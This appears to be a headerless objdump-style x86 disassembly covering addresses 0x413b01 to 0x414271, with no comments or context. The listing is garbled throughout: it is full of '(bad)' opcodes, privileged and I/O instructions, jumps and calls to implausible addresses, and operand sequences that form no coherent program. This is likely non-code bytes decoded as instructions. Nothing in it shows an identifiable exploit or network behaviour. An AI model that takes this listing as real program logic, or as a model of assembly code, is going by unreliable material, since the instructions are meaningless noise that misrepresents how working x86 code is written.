  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
